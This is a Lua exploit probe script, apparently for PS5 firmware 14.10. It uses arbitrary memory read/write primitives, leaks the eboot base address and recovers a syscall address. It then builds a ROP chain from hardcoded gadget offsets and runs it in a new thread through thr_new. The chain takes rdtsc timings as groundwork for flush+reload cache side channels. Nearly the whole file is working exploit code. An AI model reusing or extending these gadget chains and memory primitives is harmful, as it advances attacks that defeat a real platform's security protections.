-- CRASH_CLASS: LOW
-- PROBE 1403e: rdtsc timing measurement
--
-- Confirmed: rdtsc works on PS5 14.10 (1403d). CR4.TSD not set.
-- This probe takes 20 consecutive rdtsc readings from a child thread
-- to measure ROP chain overhead and TSC resolution.
-- Also tests flush+reload timing with a cache-primed vs cold read.

print("=== 1403e: rdtsc timing ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) memory.write_dword(a, v) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function wq2(addr, hi, lo)
    wd(addr, lo); wd(addr + 4, hi)
end
local function add_off(hi, lo, off)
    lo = lo + off
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return hi, lo
end

-- Eboot
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Syscall addr via SROP
local ctx = memory.alloc(0x500)
local sc_gc = mk(421)
pcall(function() return sc_gc(uint64(N(ctx))) end)
local brip = rq(N(ctx) + 0x40 + 0xA0)
if not brip then print("FAIL: no RIP") return end
local sc_hi, sc_lo = get_hi_lo(brip)
sc_lo = sc_lo - 2
if sc_lo < 0 then sc_hi = sc_hi - 1; sc_lo = sc_lo + 0x100000000 end

-- Gadgets
local g = {}
local gadgets = {
    pop_rax  = 0x992,
    pop_rdi  = 0xC9DFE,
    pop_rsi  = 0xD77D,
    pop_rcx  = 0xE64,
    mov_w    = 0x92C67,
    rdtsc    = 0x6A109,
}
for name, off in pairs(gadgets) do
    local hi, lo = add_off(eb_hi, eb_lo, off)
    g[name] = {hi, lo}
end

-- Resources
local NUM_READINGS = 20
local RESULT_SIZE = (NUM_READINGS + 1) * 8  -- +1 for marker
local result = memory.alloc(RESULT_SIZE + 16)
local res_n = N(result)
local res_hi, res_lo = get_hi_lo(result)
for i = 0, RESULT_SIZE + 12, 4 do wd(res_n + i, 0xDEADDEAD) end

local null_buf = memory.alloc(16)
wd(N(null_buf), 0); wd(N(null_buf) + 4, 0)
wd(N(null_buf) + 8, 0); wd(N(null_buf) + 12, 0)
local nb_hi, nb_lo = get_hi_lo(null_buf)

-- TCB
local tcb = memory.alloc(0x1000)
local tcb_n = N(tcb)
local tcb_hi, tcb_lo = get_hi_lo(tcb)
for i = 0, 0x1000 - 4, 4 do
    wd(tcb_n + i, (i % 8 == 0) and tcb_lo or tcb_hi)
end
local tcb_ptr = memory.alloc(8)
wq2(N(tcb_ptr), tcb_hi, tcb_lo)
local tp_hi, tp_lo = get_hi_lo(tcb_ptr)

print("alloc done")
collectgarbage("collect")

-- ============================================================
-- Build chain: sysarch + 20x(rdtsc+store) + marker + thr_exit
-- ============================================================
print("")
print("=== chain ===")

local STACK_ALLOC = 0x10000   -- 64KB (more headroom for 20 readings)
local STACK_REPORT = 0xE000   -- 56KB reported

local stk = memory.alloc(STACK_ALLOC)
local stk_n = N(stk)
for i = 0, STACK_ALLOC - 4, 4 do wd(stk_n + i, 0) end

local rsp = stk_n + STACK_REPORT
rsp = (math.floor(rsp / 16) * 16) - 8

local chain = {}

-- sysarch(165, SET_FSBASE=129, &tcb_ptr)
chain[#chain+1] = {0, 165}
chain[#chain+1] = {g.pop_rdi[1], g.pop_rdi[2]}
chain[#chain+1] = {0, 129}
chain[#chain+1] = {g.pop_rsi[1], g.pop_rsi[2]}
chain[#chain+1] = {tp_hi, tp_lo}
chain[#chain+1] = {sc_hi, sc_lo}

-- 20 rdtsc readings
for r = 0, NUM_READINGS - 1 do
    -- set RCX
    chain[#chain+1] = {g.pop_rcx[1], g.pop_rcx[2]}
    chain[#chain+1] = {nb_hi, nb_lo}
    -- rdtsc
    chain[#chain+1] = {g.rdtsc[1], g.rdtsc[2]}
    -- store RAX → result[r*8]
    chain[#chain+1] = {g.pop_rdi[1], g.pop_rdi[2]}
    local rr_hi, rr_lo = add_off(res_hi, res_lo, r * 8)
    chain[#chain+1] = {rr_hi, rr_lo}
    chain[#chain+1] = {g.mov_w[1], g.mov_w[2]}
end

-- Completion marker at result[NUM_READINGS * 8]
chain[#chain+1] = {g.pop_rax[1], g.pop_rax[2]}
chain[#chain+1] = {0, 0xCAFEF00D}
chain[#chain+1] = {g.pop_rdi[1], g.pop_rdi[2]}
local rm_hi, rm_lo = add_off(res_hi, res_lo, NUM_READINGS * 8)
chain[#chain+1] = {rm_hi, rm_lo}
chain[#chain+1] = {g.mov_w[1], g.mov_w[2]}

-- thr_exit(431, 0)
chain[#chain+1] = {g.pop_rax[1], g.pop_rax[2]}
chain[#chain+1] = {0, 431}
chain[#chain+1] = {g.pop_rdi[1], g.pop_rdi[2]}
chain[#chain+1] = {0, 0}
chain[#chain+1] = {sc_hi, sc_lo}

print("slots=" .. #chain .. " bytes=" .. (#chain * 8))

-- Check it fits in headroom
local headroom = STACK_ALLOC - STACK_REPORT
if #chain * 8 > headroom then
    print("CHAIN TOO LARGE: " .. (#chain * 8) .. " > " .. headroom)
    return
end

-- Write chain to stack
for i, entry in ipairs(chain) do
    local off = (i - 1) * 8
    wd(rsp + off, entry[2])
    wd(rsp + off + 4, entry[1])
end

-- thr_param
local param = memory.alloc(0x40)
local param_n = N(param)
wq2(param_n + 0x00, g.pop_rax[1], g.pop_rax[2])
wq2(param_n + 0x08, res_hi, res_lo)
wq2(param_n + 0x10, get_hi_lo(stk))
wq2(param_n + 0x18, 0, STACK_REPORT)
wq2(param_n + 0x20, 0, 0)
wq2(param_n + 0x28, 0, 0)
local ctid = memory.alloc(8)
wd(N(ctid), 0); wd(N(ctid) + 4, 0)
wq2(param_n + 0x30, get_hi_lo(ctid))

collectgarbage("collect")

-- ============================================================
-- Launch
-- ============================================================
print("")
print("=== launch ===")

local sc_thr = mk(455)
local ok_t, rv_t = pcall(function()
    return sc_thr(uint64(N(param)), uint64(0x38))
end)
if not ok_t then print("thr_new FAIL") return end
print("thr_new=" .. N(rv_t))

-- Poll for marker
local marker_off = NUM_READINGS * 8
local found = false
for i = 1, 200000 do
    local m = rd(res_n + marker_off)
    if m ~= 0xDEADDEAD then
        found = true
        print("done at poll " .. i)
        break
    end
end
if not found then
    print("TIMEOUT")
end

-- ============================================================
-- Read results
-- ============================================================
print("")
print("=== results ===")

local readings = {}
for i = 0, NUM_READINGS - 1 do
    local lo = rd(res_n + i * 8) or 0
    local hi = rd(res_n + i * 8 + 4) or 0
    readings[i+1] = {lo = lo, hi = hi}
end

-- Print all readings
for i = 1, NUM_READINGS do
    local r = readings[i]
    print(string.format("TSC[%02d]=0x%08X%08X lo_b=%d", i, r.hi, r.lo, r.lo % 256))
end

-- Marker
local mlo = rd(res_n + marker_off) or 0
local mhi = rd(res_n + marker_off + 4) or 0
print(string.format("marker=0x%08X%08X", mhi, mlo))

-- Compute deltas (low 32 bits only — high bits lost by gadget)
print("")
print("=== deltas ===")

local deltas = {}
for i = 2, NUM_READINGS do
    local d = readings[i].lo - readings[i-1].lo
    if d < 0 then d = d + 0x100000000 end
    -- Clear low byte (always 1)
    local d_clean = d - (d % 256)
    deltas[#deltas+1] = d_clean
    if i <= 11 then
        print(string.format("d[%02d-%02d]=%8d cycles (~%d ns at 3.5GHz)",
            i-1, i, d_clean, math.floor(d_clean / 3.5)))
    end
end

-- Stats
if #deltas > 0 then
    table.sort(deltas)
    local min_d = deltas[1]
    local max_d = deltas[#deltas]
    local med_d = deltas[math.floor(#deltas/2)+1]
    local sum = 0
    for _, d in ipairs(deltas) do sum = sum + d end
    local avg = math.floor(sum / #deltas)

    print("")
    print(string.format("min=%d max=%d median=%d avg=%d cycles", min_d, max_d, med_d, avg))
    print(string.format("min=~%d ns  median=~%d ns  avg=~%d ns (at 3.5GHz)",
        math.floor(min_d / 3.5), math.floor(med_d / 3.5), math.floor(avg / 3.5)))

    if med_d > 0 and med_d < 100000 then
        print("*** rdtsc CONFIRMED — sub-microsecond timing available ***")
    elseif med_d == 0 then
        print("*** ALL ZEROS — gadget returns constant, not real TSC ***")
    else
        print("*** LARGE DELTAS — possible context switch interference ***")
    end
end

print("")
print("=== 1403e DONE ===")
